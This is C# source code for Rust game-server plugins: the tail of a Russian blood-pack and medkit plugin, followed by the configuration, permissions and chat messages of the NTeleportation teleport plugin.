		#endregion
		
		#region Commands
		
		[ChatCommand("sm_give")]
        private void CommandGive(BasePlayer player, string command, string[] args)
        {
            if (!player.IsAdmin) return;            			
			
			GiveBlood(player, 5);
			
			var byItemId = ItemManager.CreateByName(MedkitItemName, 1, configData.SuperMedkitSkin);
			byItemId.name = configData.SuperMedkitName;
			player.GiveItem(byItemId);			
        }
		
		#endregion
		
		#region Config
		
        private static ConfigData configData;
		
        private class ConfigData
        {            
			[JsonProperty(PropertyName = "При добыче мяса животных выпадает кровь")]
			public Dictionary<string, int> BloodRates; 
			[JsonProperty(PropertyName = "Название на пакете с кровью")]
			public string BloodName;
			[JsonProperty(PropertyName = "Скин супер аптечки")]
			public ulong SuperMedkitSkin;
			[JsonProperty(PropertyName = "Название супер аптечки")]
			public string SuperMedkitName;
        }
		
        private void LoadVariables() => configData = Config.ReadObject<ConfigData>();        
		
        protected override void LoadDefaultConfig()
        {
            configData = new ConfigData
            {
                BloodRates = new Dictionary<string, int>()
				{
					{ "wolfmeat.raw", 1 },
					{ "meat.boar", 1 },
					{ "deermeat.raw", 1 },
					{ "bearmeat", 2 }
				},
				BloodName = "Кровь (перетащите кровь на аптечку для её апгрейда)",
				SuperMedkitSkin = 2001406820,
				SuperMedkitName = "Улучшенная аптечка"
            };
            SaveConfig(configData);
			timer.Once(0.1f, ()=> SaveConfig(configData));
        }        
		
        private void SaveConfig(ConfigData config) => Config.WriteObject(config, true);
		
        #endregion
		
    }
}


###ПЛАГИН НА ТЕЛЕПОРТАЦИЮ###


//#define DEBUG
using Facepunch;
using Network;
using Newtonsoft.Json.Converters;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json;
using Oxide.Core.Configuration;
using Oxide.Core.Libraries.Covalence;
using Oxide.Core.Plugins;
using Oxide.Core;
using Oxide.Game.Rust;
using Rust;
using System.Collections.Generic;
using System.Collections;
using System.Globalization;
using System.Linq;
using System.Reflection;
using System;
using UnityEngine;
using System.IO;

// scrap payments to bypass cooldown
// costs to buy teleport

/*
Fixed locations for bandit and outpost being set to monuments underneath them
Adjusted teleport position by an increase of 0.1 meters due to crazy InsideTerrain bugs
Added back API for GetLimitRemaining and GetCooldownRemaining
Added `Play Sounds After Teleport` (false) - set true to enable next option
Added `Sounds To Player After Teleport` (list of 5 different sounds)
Added `Block All Teleporting From Inside Authorized Base` (false)
Added `Global Teleport Cooldown` (0)
Added `Global VIP Teleport Cooldown` (0) - requires: nteleportation.globalcooldownvip
Added API (GetLimitRemaining, GetCooldownRemaining, GetCountdownRemaining) (player, type)
- e.g: int limit = Convert.ToInt32(NTeleportation?.Call("GetLimitRemaining", player, "tpr"));
*/

namespace Oxide.Plugins
{
    [Info("NTeleportation", "nivex", "1.6.8")]
    [Description("Multiple teleportation systems for admin and players")]
    class NTeleportation : RustPlugin
    {
        [PluginReference]
        private Plugin Clans, Economics, ServerRewards, Friends, CompoundTeleport, ZoneManager, NoEscape, Vanish, PopupNotifications;

        private Dictionary<string, BasePlayer> _ids = new Dictionary<string, BasePlayer>();
        private Dictionary<BasePlayer, string> _players = new Dictionary<BasePlayer, string>();

        private bool newSave;
        private string banditPrefab;
        private string outpostPrefab;
        private const string NewLine = "\n";
        private const string PermAdmin = "nteleportation.admin";
        private const string ConfigDefaultPermVip = "nteleportation.vip";
        private const string PermHome = "nteleportation.home";
        private const string PermWipeHomes = "nteleportation.wipehomes";
        private const string PermCraftHome = "nteleportation.crafthome";
        private const string PermDeleteHome = "nteleportation.deletehome";
        private const string PermHomeHomes = "nteleportation.homehomes";
        private const string PermImportHomes = "nteleportation.importhomes";
        private const string PermRadiusHome = "nteleportation.radiushome";
        private const string PermCraftTpR = "nteleportation.crafttpr";
        private const string PermTpR = "nteleportation.tpr";
        private const string PermTp = "nteleportation.tp";
        private const string PermTpT = "nteleportation.tpt";
        private const string PermTpB = "nteleportation.tpb";
        private const string PermTpN = "nteleportation.tpn";
        private const string PermTpL = "nteleportation.tpl";
        private const string PermTpConsole = "nteleportation.tpconsole";
        private const string PermTpHome = "nteleportation.tphome";
        private const string PermTpRemove = "nteleportation.tpremove";
        private const string PermTpSave = "nteleportation.tpsave";
        private const string PermExempt = "nteleportation.exemptfrominterruptcountdown";
        private const string PermFoundationCheck = "nteleportation.bypassfoundationcheck";
        private const string PermTpMarker = "nteleportation.tpmarker";
        private DynamicConfigFile dataConvert;
        private DynamicConfigFile dataDisabled;
        private DynamicConfigFile dataAdmin;
        private DynamicConfigFile dataHome;
        private DynamicConfigFile dataTPR;
        private DynamicConfigFile dataTPT;
        private Dictionary<ulong, AdminData> _Admin;
        private Dictionary<ulong, HomeData> _Home;
        private Dictionary<ulong, TeleportData> _TPR;
        private List<string> TPTToggle;
        private bool changedAdmin;
        private bool changedHome;
        private bool changedTPR;
        private bool changedTPT;
        private float boundary;
        private readonly Dictionary<ulong, float> TeleportCooldowns = new Dictionary<ulong, float>();
        private readonly Dictionary<ulong, TeleportTimer> TeleportTimers = new Dictionary<ulong, TeleportTimer>();
        private readonly Dictionary<ulong, Timer> PendingRequests = new Dictionary<ulong, Timer>();
        private readonly Dictionary<ulong, BasePlayer> PlayersRequests = new Dictionary<ulong, BasePlayer>();
        private readonly Dictionary<int, string> ReverseBlockedItems = new Dictionary<int, string>();
        private readonly Dictionary<ulong, Vector3> teleporting = new Dictionary<ulong, Vector3>();
        private SortedDictionary<string, Vector3> caves = new SortedDictionary<string, Vector3>();
        private SortedDictionary<string, MonInfo> monuments = new SortedDictionary<string, MonInfo>();
        private bool outpostEnabled;
        private bool banditEnabled;

        class MonInfo
        {
            public Vector3 Position;
            public float Radius;
        }

        #region Configuration

        private static Configuration config;

        public class InterruptSettings
        {
            [JsonProperty(PropertyName = "Interrupt Teleport At Specific Monuments", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public List<string> Monuments { get; set; } = new List<string>();

            [JsonProperty(PropertyName = "Above Water")]
            public bool AboveWater { get; set; } = true;

            [JsonProperty(PropertyName = "Balloon")]
            public bool Balloon { get; set; } = true;

            [JsonProperty(PropertyName = "Boats")]
            public bool Boats { get; set; }

            [JsonProperty(PropertyName = "Cargo Ship")]
            public bool Cargo { get; set; } = true;

            [JsonProperty(PropertyName = "Cold")]
            public bool Cold { get; set; } = false;

            [JsonProperty(PropertyName = "Excavator")]
            public bool Excavator { get; set; } = false;

            [JsonProperty(PropertyName = "Hot")]
            public bool Hot { get; set; } = false;

            [JsonProperty(PropertyName = "Hostile")]
            public bool Hostile { get; set; } = false;

            [JsonProperty(PropertyName = "Hurt")]
            public bool Hurt { get; set; } = true;

            [JsonProperty(PropertyName = "Junkpiles")]
            public bool Junkpiles { get; set; }

            [JsonProperty(PropertyName = "Lift")]
            public bool Lift { get; set; } = true;

            [JsonProperty(PropertyName = "Monument")]
            public bool Monument { get; set; } = false;

            [JsonProperty(PropertyName = "Ignore Monument Marker Prefab")]
            public bool BypassMonumentMarker { get; set; } = false;

            [JsonProperty(PropertyName = "Mounted")]
            public bool Mounted { get; set; } = true;

            [JsonProperty(PropertyName = "Oil Rig")]
            public bool Oilrig { get; set; } = false;

            [JsonProperty(PropertyName = "Safe Zone")]
            public bool Safe { get; set; } = true;

            [JsonProperty(PropertyName = "Swimming")]
            public bool Swimming { get; set; } = false;
        }

        public class PluginSettings
        {
            [JsonProperty(PropertyName = "Interrupt TP")]
            public InterruptSettings Interrupt { get; set; } = new InterruptSettings();

            [JsonProperty(PropertyName = "Block Teleport (NoEscape)")]
            public bool BlockNoEscape { get; set; } = false;

            [JsonProperty(PropertyName = "Block Teleport (ZoneManager)")]
            public bool BlockZoneFlag { get; set; } = false;

            [JsonProperty(PropertyName = "Chat Name")]
            public string ChatName { get; set; } = "<color=red>Teleportation</color> \n\n";

            [JsonProperty(PropertyName = "Chat Steam64ID")]
            public ulong ChatID { get; set; } = 76561199056025689;

            [JsonProperty(PropertyName = "Check Boundaries On Teleport X Y Z")]
            public bool CheckBoundaries { get; set; } = true;

            [JsonProperty(PropertyName = "Data File Directory (Blank = Default)")]
            public string DataFileFolder { get; set; } = string.Empty;

            [JsonProperty(PropertyName = "Draw Sphere On Set Home")]
            public bool DrawHomeSphere { get; set; } = true;

            [JsonProperty(PropertyName = "Homes Enabled")]
            public bool HomesEnabled { get; set; } = true;

            [JsonProperty(PropertyName = "TPR Enabled")]
            public bool TPREnabled { get; set; } = true;

            [JsonProperty(PropertyName = "Strict Foundation Check")]
            public bool StrictFoundationCheck { get; set; } = false;

            [JsonProperty(PropertyName = "Cave Distance Small")]
            public float CaveDistanceSmall { get; set; } = 50f;

            [JsonProperty(PropertyName = "Cave Distance Medium")]
            public float CaveDistanceMedium { get; set; } = 70f;

            [JsonProperty(PropertyName = "Cave Distance Large")]
            public float CaveDistanceLarge { get; set; } = 110f;

            [JsonProperty(PropertyName = "Default Monument Size")]
            public float DefaultMonumentSize { get; set; } = 50f;

            [JsonProperty(PropertyName = "Minimum Temp")]
            public float MinimumTemp { get; set; } = 0f;

            [JsonProperty(PropertyName = "Maximum Temp")]
            public float MaximumTemp { get; set; } = 40f;

            [JsonProperty(PropertyName = "Blocked Items", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public Dictionary<string, string> BlockedItems { get; set; } = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

            [JsonProperty(PropertyName = "Bypass CMD")]
            public string BypassCMD { get; set; } = "pay";

            [JsonProperty(PropertyName = "Use Monument Topology Check")]
            public bool MonumentTopologyCheck { get; set; }

            [JsonProperty(PropertyName = "Use Cave Topology Check")]
            public bool CaveTopologyCheck { get; set; } = false;

            [JsonProperty(PropertyName = "Use Economics")]
            public bool UseEconomics { get; set; } = false;

            [JsonProperty(PropertyName = "Use Server Rewards")]
            public bool UseServerRewards { get; set; } = false;

            [JsonProperty(PropertyName = "Wipe On Upgrade Or Change")]
            public bool WipeOnUpgradeOrChange { get; set; } = true;

            [JsonProperty(PropertyName = "Auto Generate Outpost Location")]
            public bool AutoGenOutpost { get; set; } = true;

            [JsonProperty(PropertyName = "Auto Generate Bandit Location")]
            public bool AutoGenBandit { get; set; } = true;

            [JsonProperty(PropertyName = "Show Time As Seconds Instead")]
            public bool UseSeconds { get; set; } = false;

            [JsonProperty(PropertyName = "Chat Command Color")]
            public string ChatCommandColor = "#FFFF00";

            [JsonProperty(PropertyName = "Chat Command Argument Color")]
            public string ChatCommandArgumentColor = "#FFA500";

            [JsonProperty("Enable Popup Support")]
            public bool UsePopup = false;

            [JsonProperty("Block All Teleporting From Inside Authorized Base")]
            public bool BlockAuthorizedTeleporting = false;

            [JsonProperty("TPB Available After X Seconds")]
            public float TPBTime = 0f;

            [JsonProperty("Global Teleport Cooldown")]
            public float Global = 0f;

            [JsonProperty("Global VIP Teleport Cooldown")]
            public float GlobalVIP = 0f;

            [JsonProperty("Play Sounds After Teleport")]
            public bool PlaySounds = false;

            [JsonProperty("Sounds To Play After Teleport", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public List<string> PrefabSounds = new List<string>
            {
                "assets/prefabs/misc/xmas/presents/effects/unwrap.prefab",
                "assets/bundled/prefabs/fx/player/howl.prefab",
                "assets/content/vehicles/minicopter/debris_effect.prefab",
                "assets/prefabs/npc/patrol helicopter/damage_effect_debris.prefab",
                "assets/prefabs/npc/patrol helicopter/effects/rocket_fire.prefab"
            };
        }
        
        public class AdminSettings
        {
            [JsonProperty(PropertyName = "Announce Teleport To Target")]
            public bool AnnounceTeleportToTarget { get; set; } = false;

            [JsonProperty(PropertyName = "Usable By Admins")]
            public bool UseableByAdmins { get; set; } = true;

            [JsonProperty(PropertyName = "Usable By Moderators")]
            public bool UseableByModerators { get; set; } = true;

            [JsonProperty(PropertyName = "Location Radius")]
            public int LocationRadius { get; set; } = 25;

            [JsonProperty(PropertyName = "Teleport Near Default Distance")]
            public int TeleportNearDefaultDistance { get; set; } = 30;
        }

        public class HomesSettings
        {
            [JsonProperty(PropertyName = "Homes Limit")]
            public int HomesLimit { get; set; } = 2;

            [JsonProperty(PropertyName = "VIP Homes Limits", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public Dictionary<string, int> VIPHomesLimits { get; set; } = new Dictionary<string, int> { { ConfigDefaultPermVip, 5 } };

            [JsonProperty(PropertyName = "Allow Sethome At Specific Monuments", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public List<string> AllowedMonuments { get; set; } = new List<string> { "HQM Quarry", "Stone Quarry", "Sulfur Quarry", "Ice Lake" };

            [JsonProperty(PropertyName = "Allow Sethome At All Monuments")]
            public bool AllowAtAllMonuments { get; set; } = false;

            [JsonProperty(PropertyName = "Allow TPB")]
            public bool AllowTPB { get; set; } = true;

            [JsonProperty(PropertyName = "Cooldown")]
            public int Cooldown { get; set; } = 600;

            [JsonProperty(PropertyName = "Countdown")]
            public int Countdown { get; set; } = 15;

            [JsonProperty(PropertyName = "Daily Limit")]
            public int DailyLimit { get; set; } = 5;

            [JsonProperty(PropertyName = "VIP Daily Limits", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public Dictionary<string, int> VIPDailyLimits { get; set; } = new Dictionary<string, int> { { ConfigDefaultPermVip, 5 } };

            [JsonProperty(PropertyName = "VIP Cooldowns", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public Dictionary<string, int> VIPCooldowns { get; set; } = new Dictionary<string, int> { { ConfigDefaultPermVip, 5 } };

            [JsonProperty(PropertyName = "VIP Countdowns", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public Dictionary<string, int> VIPCountdowns { get; set; } = new Dictionary<string, int> { { ConfigDefaultPermVip, 5 } };

            [JsonProperty(PropertyName = "Location Radius")]
            public int LocationRadius { get; set; } = 25;

            [JsonProperty(PropertyName = "Force On Top Of Foundation")]
            public bool ForceOnTopOfFoundation { get; set; } = true;

            [JsonProperty(PropertyName = "Check Foundation For Owner")]
            public bool CheckFoundationForOwner { get; set; } = true;

            [JsonProperty(PropertyName = "Use Friends")]
            public bool UseFriends { get; set; } = true;

            [JsonProperty(PropertyName = "Use Clans")]
            public bool UseClans { get; set; } = true;

            [JsonProperty(PropertyName = "Use Teams")]
            public bool UseTeams { get; set; } = true;

            [JsonProperty(PropertyName = "Usable Out Of Building Blocked")]
            public bool UsableOutOfBuildingBlocked { get; set; } = false;

            [JsonProperty(PropertyName = "Usable Into Building Blocked")]
            public bool UsableIntoBuildingBlocked { get; set; } = false;

            [JsonProperty(PropertyName = "Usable From Safe Zone Only")]
            public bool UsableFromSafeZoneOnly { get; set; } = false;

            [JsonProperty(PropertyName = "Allow Cupboard Owner When Building Blocked")]
            public bool CupOwnerAllowOnBuildingBlocked { get; set; } = true;

            [JsonProperty(PropertyName = "Allow Iceberg")]
            public bool AllowIceberg { get; set; } = false;

            [JsonProperty(PropertyName = "Allow Cave")]
            public bool AllowCave { get; set; }

            [JsonProperty(PropertyName = "Allow Crafting")]
            public bool AllowCraft { get; set; } = false;

            [JsonProperty(PropertyName = "Allow Above Foundation")]
            public bool AllowAboveFoundation { get; set; } = true;

            [JsonProperty(PropertyName = "Check If Home Is Valid On Listhomes")]
            public bool CheckValidOnList { get; set; } = false;

            [JsonProperty(PropertyName = "Pay")]
            public int Pay { get; set; } = 0;

            [JsonProperty(PropertyName = "Bypass")]
            public int Bypass { get; set; } = 0;
        }

        public class TPTSettings
        {
            [JsonProperty(PropertyName = "Use Friends")]
            public bool UseFriends { get; set; }

            [JsonProperty(PropertyName = "Use Clans")]
            public bool UseClans { get; set; }

            [JsonProperty(PropertyName = "Use Teams")]
            public bool UseTeams { get; set; }

            [JsonProperty(PropertyName = "Allow Cave")]
            public bool AllowCave { get; set; }
        }

        public class TPRSettings
        {
            [JsonProperty(PropertyName = "Require Player To Be Friend, Clan Mate, Or Team Mate")]
            public bool UseClans_Friends_Teams { get; set; }

            [JsonProperty(PropertyName = "Allow Cave")]
            public bool AllowCave { get; set; }

            [JsonProperty(PropertyName = "Allow TPB")]
            public bool AllowTPB { get; set; } = true;

            [JsonProperty(PropertyName = "Cooldown")]
            public int Cooldown { get; set; } = 600;

            [JsonProperty(PropertyName = "Countdown")]
            public int Countdown { get; set; } = 15;

            [JsonProperty(PropertyName = "Daily Limit")]
            public int DailyLimit { get; set; } = 5;

            [JsonProperty(PropertyName = "VIP Daily Limits", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public Dictionary<string, int> VIPDailyLimits { get; set; } = new Dictionary<string, int> { { ConfigDefaultPermVip, 5 } };

            [JsonProperty(PropertyName = "VIP Cooldowns", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public Dictionary<string, int> VIPCooldowns { get; set; } = new Dictionary<string, int> { { ConfigDefaultPermVip, 5 } };

            [JsonProperty(PropertyName = "VIP Countdowns", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public Dictionary<string, int> VIPCountdowns { get; set; } = new Dictionary<string, int> { { ConfigDefaultPermVip, 5 } };

            [JsonProperty(PropertyName = "Request Duration")]
            public int RequestDuration { get; set; } = 30;

            [JsonProperty(PropertyName = "Block TPA On Ceiling")]
            public bool BlockTPAOnCeiling { get; set; } = true;

            [JsonProperty(PropertyName = "Usable Out Of Building Blocked")]
            public bool UsableOutOfBuildingBlocked { get; set; } = false;

            [JsonProperty(PropertyName = "Usable Into Building Blocked")]
            public bool UsableIntoBuildingBlocked { get; set; } = false;

            [JsonProperty(PropertyName = "Allow Cupboard Owner When Building Blocked")]
            public bool CupOwnerAllowOnBuildingBlocked { get; set; } = true;

            [JsonProperty(PropertyName = "Allow Crafting")]
            public bool AllowCraft { get; set; } = false;

            [JsonProperty(PropertyName = "Pay")]
            public int Pay { get; set; } = 0;

            [JsonProperty(PropertyName = "Bypass")]
            public int Bypass { get; set; } = 0;
        }

        public class TownSettings
        {
            [JsonProperty(PropertyName = "Command Enabled")]
            public bool Enabled { get; set; } = true;

            [JsonProperty(PropertyName = "Allow TPB")]
            public bool AllowTPB { get; set; } = true;

            [JsonProperty(PropertyName = "Allow Cave")]
            public bool AllowCave { get; set; }

            [JsonProperty(PropertyName = "Cooldown")]
            public int Cooldown { get; set; } = 600;

            [JsonProperty(PropertyName = "Countdown")]
            public int Countdown { get; set; } = 15;

            [JsonProperty(PropertyName = "Daily Limit")]
            public int DailyLimit { get; set; } = 5;

            [JsonProperty(PropertyName = "VIP Daily Limits", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public Dictionary<string, int> VIPDailyLimits { get; set; } = new Dictionary<string, int> { { ConfigDefaultPermVip, 5 } };

            [JsonProperty(PropertyName = "VIP Cooldowns", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public Dictionary<string, int> VIPCooldowns { get; set; } = new Dictionary<string, int> { { ConfigDefaultPermVip, 5 } };

            [JsonProperty(PropertyName = "VIP Countdowns", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public Dictionary<string, int> VIPCountdowns { get; set; } = new Dictionary<string, int> { { ConfigDefaultPermVip, 5 } };

            [JsonProperty(PropertyName = "Location")]
            public Vector3 Location { get; set; } = Vector3.zero;

            [JsonProperty(PropertyName = "Locations", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public List<Vector3> Locations { get; set; } = new List<Vector3>();

            [JsonProperty(PropertyName = "Teleport To Random Location")]
            public bool Random { get; set; } = true;

            [JsonProperty(PropertyName = "Usable Out Of Building Blocked")]
            public bool UsableOutOfBuildingBlocked { get; set; } = false;

            [JsonProperty(PropertyName = "Allow Crafting")]
            public bool AllowCraft { get; set; } = false;

            [JsonProperty(PropertyName = "Pay")]
            public int Pay { get; set; } = 0;

            [JsonProperty(PropertyName = "Bypass")]
            public int Bypass { get; set; } = 0;

            public bool CanCraft(BasePlayer player, string command)
            {
                return AllowCraft || player.IPlayer.HasPermission($"nteleportation.craft{command}");
            }

            [JsonIgnore]
            public StoredData Teleports = new StoredData();

            [JsonIgnore]
            public string Command { get; set; }
        }

        private class Configuration
        {
            [JsonProperty(PropertyName = "Settings")]
            public PluginSettings Settings = new PluginSettings();

            [JsonProperty(PropertyName = "Admin")]
            public AdminSettings Admin = new AdminSettings();

            [JsonProperty(PropertyName = "Home")]
            public HomesSettings Home = new HomesSettings();

            [JsonProperty(PropertyName = "TPT")]
            public TPTSettings TPT = new TPTSettings();

            [JsonProperty(PropertyName = "TPR")]
            public TPRSettings TPR = new TPRSettings();

            [JsonProperty(PropertyName = "Dynamic Commands", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public Dictionary<string, TownSettings> DynamicCommands { get; set; } = DefaultCommands;
        }

        private static Dictionary<string, TownSettings> DefaultCommands = new Dictionary<string, TownSettings>
        {
            ["Town"] = new TownSettings() { Random = false },
            ["Island"] = new TownSettings() { AllowTPB = false },
            ["Outpost"] = new TownSettings(),
            ["Bandit"] = new TownSettings(),
        };

        public void InitializeDynamicCommands()
        {
            banditPrefab = StringPool.Get(2074025910);
            outpostPrefab = StringPool.Get(1879405026);

            foreach (var entry in config.DynamicCommands)
            {
                if (!entry.Value.Enabled)
                {
                    continue;
                }
                else if (entry.Key.Equals("bandit", StringComparison.OrdinalIgnoreCase))
                {
                    if (CompoundTeleport == null)
                    {
                        banditEnabled = true;
                    }
                    else continue;
                }
                else if (entry.Key.Equals("outpost", StringComparison.OrdinalIgnoreCase))
                {
                    if (CompoundTeleport == null)
                    {
                        outpostEnabled = true;
                    }
                    else continue;
                }

                entry.Value.Command = entry.Key;
                RegisterCommand(entry.Key, nameof(CommandCustom));
            }

            RegisterCommand("ntp", nameof(CommandDynamic), PermAdmin);
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                Config.Settings.Converters = new JsonConverter[] { new UnityVector3Converter() };
                config = Config.ReadObject<Configuration>();
                if (config == null) LoadDefaultConfig();
                SaveConfig();
            }
            catch (JsonException ex)
            {
                Debug.LogException(ex);
                LoadDefaultConfig();
            }
        }

        protected override void SaveConfig()
        {
            Config.WriteObject(config);
        }

        protected override void LoadDefaultConfig()
        {
            config = new Configuration();
            Puts("Loaded default configuration.");
        }

        #endregion

        class DisabledData
        {
            [JsonProperty("List of disabled commands")]
            public List<string> DisabledCommands = new List<string>();

            public DisabledData() { }
        }

        DisabledData DisabledCommandData = new DisabledData();

        class AdminData
        {
            [JsonProperty("pl")]
            public Vector3 PreviousLocation { get; set; }

            [JsonProperty("l")]
            public Dictionary<string, Vector3> Locations { get; set; } = new Dictionary<string, Vector3>(StringComparer.OrdinalIgnoreCase);
        }

        class HomeData
        {
            [JsonProperty("l")]
            public Dictionary<string, Vector3> Locations { get; set; } = new Dictionary<string, Vector3>(StringComparer.OrdinalIgnoreCase);

            [JsonProperty("t")]
            public TeleportData Teleports { get; set; } = new TeleportData();
        }

        public class TeleportData
        {
            [JsonProperty("a")]
            public int Amount { get; set; }

            [JsonProperty("d")]
            public string Date { get; set; }

            [JsonProperty("t")]
            public int Timestamp { get; set; }
        }

        class TeleportTimer
        {
            public Timer Timer { get; set; }
            public BasePlayer OriginPlayer { get; set; }
            public BasePlayer TargetPlayer { get; set; }
        }

        private enum checkmode
        {
            home, tpr, tpa, town
        };

        protected override void LoadDefaultMessages()
        {
            var en = new Dictionary<string, string>
            {
                {"ErrorTPR", "Teleporting to {0} is blocked ({1})"},
                {"AdminTP", "You teleported to {0}!"},
                {"AdminTPTarget", "{0} teleported to you!"},
                {"AdminTPPlayers", "You teleported {0} to {1}!"},
                {"AdminTPPlayer", "{0} teleported you to {1}!"},
                {"AdminTPPlayerTarget", "{0} teleported {1} to you!"},
                {"AdminTPCoordinates", "You teleported to {0}!"},
                {"AdminTPTargetCoordinates", "You teleported {0} to {1}!"},
                {"AdminTPOutOfBounds", "You tried to teleport to a set of coordinates outside the map boundaries!"},
                {"AdminTPBoundaries", "X and Z values need to be between -{0} and {0} while the Y value needs to be between -100 and 2000!"},
                {"AdminTPLocation", "You teleported to {0}!"},
                {"AdminTPLocationSave", "You have saved the current location!"},
                {"AdminTPLocationRemove", "You have removed the location {0}!"},
                {"AdminLocationList", "The following locations are available:"},
                {"AdminLocationListEmpty", "You haven't saved any locations!"},
                {"AdminTPBack", "You've teleported back to your previous location!"},
                {"AdminTPBackSave", "Your previous location has been saved, use /tpb to teleport back!"},
                {"AdminTPTargetCoordinatesTarget", "{0} teleported you to {1}!"},
                {"AdminTPConsoleTP", "You were teleported to {0}"},
                {"AdminTPConsoleTPPlayer", "You were teleported to {0}"},
                {"AdminTPConsoleTPPlayerTarget", "{0} was teleported to you!"},
                {"HomeTP", "You teleported to your home '{0}'!"},
                {"HomeAdminTP", "You teleported to {0}'s home '{1}'!"},
                {"HomeSave", "You have saved the current location as your home!"},
                {"HomeNoFoundation", "You can only use a home location on a foundation!"},
                {"HomeFoundationNotOwned", "You can't use home on someone else's house."},
                {"HomeFoundationUnderneathFoundation", "You can't use home on a foundation that is underneath another foundation."},
                {"HomeFoundationNotFriendsOwned", "You or a friend need to own the house to use home!"},
                {"HomeRemovedInvalid", "Your home '{0}' was removed because not on a foundation or not owned!"},
                {"HighWallCollision", "High Wall Collision!"},
                {"HomeRemovedInsideBlock", "Your home '{0}' was removed because inside a foundation!"},
                {"HomeRemove", "You have removed your home {0}!"},
                {"HomeDelete", "You have removed {0}'s home '{1}'!"},
                {"HomeList", "The following homes are available:"},
                {"HomeListEmpty", "You haven't saved any homes!"},
                {"HomeMaxLocations", "Unable to set your home here, you have reached the maximum of {0} homes!"},
                {"HomeQuota", "You have set {0} of the maximum {1} homes!"},
                {"HomeTPStarted", "Teleporting to your home {0} in {1} seconds!"},
                {"PayToTown", "Standard payment of {0} applies to all {1} teleports!"},
                {"PayToTPR", "Standard payment of {0} applies to all tprs!"},
                {"HomeTPCooldown", "Your teleport is currently on cooldown. You'll have to wait {0} for your next teleport."},
                {"HomeTPCooldownBypass", "Your teleport was currently on cooldown. You chose to bypass that by paying {0} from your balance."},
                {"HomeTPCooldownBypassF", "Your teleport is currently on cooldown. You do not have sufficient funds - {0} - to bypass."},
                {"HomeTPCooldownBypassP", "You may choose to pay {0} to bypass this cooldown." },
                {"HomeTPCooldownBypassP2", "Type /home NAME {0}." },
                {"HomeTPLimitReached", "You have reached the daily limit of {0} teleports today!"},
                {"HomeTPAmount", "You have {0} home teleports left today!"},
                {"HomesListWiped", "You have wiped all the saved home locations!"},
                {"HomeTPBuildingBlocked", "You can't set your home if you are not allowed to build in this zone!"},
                {"HomeTPSwimming", "You can't set your home while swimming!"},
                {"HomeTPCrafting", "You can't set your home while crafting!"},
                {"Request", "You've requested a teleport to {0}!"},
                {"RequestTarget", "{0} requested to be teleported to you! Use '/tpa' to accept!"},
                {"TPR_NoClan_NoFriend_NoTeam", "This command is only available to friends or teammates or clanmates!"},
                {"PendingRequest", "You already have a request pending, cancel that request or wait until it gets accepted or times out!"},
                {"PendingRequestTarget", "The player you wish to teleport to already has a pending request, try again later!"},
                {"NoPendingRequest", "You have no pending teleport request!"},
                {"AcceptOnRoof", "You can't accept a teleport while you're on a ceiling, get to ground level!"},
                {"Accept", "{0} has accepted your teleport request! Teleporting in {1} seconds!"},
                {"AcceptTarget", "You've accepted the teleport request of {0}!"},
                {"AcceptToggleOff", "You've disabled automatic /tpa!"},
                {"AcceptToggleOn", "You've enabled automatic /tpa!"},
                {"NotAllowed", "You are not allowed to use this command!"},
                {"Success", "You teleported to {0}!"},
                {"SuccessTarget", "{0} teleported to you!"},
                {"Cancelled", "Your teleport request to {0} was cancelled!"},
                {"CancelledTarget", "{0} teleport request was cancelled!"},
                {"TPCancelled", "Your teleport was cancelled!"},
                {"TPCancelledTarget", "{0} cancelled teleport!"},
                {"TPYouCancelledTarget", "You cancelled {0} teleport!"},
                {"TimedOut", "{0} did not answer your request in time!"},
                {"TimedOutTarget", "You did not answer {0}'s teleport request in time!"},
                {"TargetDisconnected", "{0} has disconnected, your teleport was cancelled!"},
                {"TPRCooldown", "Your teleport requests are currently on cooldown. You'll have to wait {0} to send your next teleport request."},
                {"TPRCooldownBypass", "Your teleport request was on cooldown. You chose to bypass that by paying {0} from your balance."},
                {"TPRCooldownBypassF", "Your teleport is currently on cooldown. You do not have sufficient funds - {0} - to bypass."},
                {"TPRCooldownBypassP", "You may choose to pay {0} to bypass this cooldown." },
                {"TPMoney", "{0} deducted from your account!"},
                {"TPNoMoney", "You do not have {0} in any account!"},
                {"TPRCooldownBypassP2", "Type /tpr {0}." },
                {"TPRCooldownBypassP2a", "Type /tpr NAME {0}." },
                {"TPRLimitReached", "You have reached the daily limit of {0} teleport requests today!"},
                {"TPRAmount", "You have {0} teleport requests left today!"},
                {"TPRTarget", "Your target is currently not available!"},
                {"TPDead", "You can't teleport while being dead!"},
                {"TPWounded", "You can't teleport while wounded!"},
                {"TPTooCold", "You're too cold to teleport!"},
                {"TPTooHot", "You're too hot to teleport!"},
                {"TPBoat", "You can't teleport while on a boat!"},
                {"TPHostile", "Can't teleport to outpost or bandit when hostile!"},
                {"TPJunkpile", "You can't teleport from a junkpile!"},
                {"HostileTimer", "Teleport available in {0} minutes."},
                {"TPMounted", "You can't teleport while seated!"},
                //{"TPInsideTerrainFrom", "You can't teleport while inside terrain!"},
                //{"TPInsideTerrainTo", "You can't teleport into a location that is inside terrain!"},
                {"TPBuildingBlocked", "You can't teleport while in a building blocked zone!"},
                {"TPAboveWater", "You can't teleport while above water!"},
                {"TPTargetBuildingBlocked", "You can't teleport in a building blocked zone!"},
                {"TPTargetInsideBlock", "You can't teleport into a foundation!"},
                {"TPSwimming", "You can't teleport while swimming!"},
                {"TPCargoShip", "You can't teleport from the cargo ship!"},
                {"TPOilRig", "You can't teleport from the oil rig!"},
                {"TPExcavator", "You can't teleport from the excavator!"},
                {"TPHotAirBalloon", "You can't teleport to or from a hot air balloon!"},
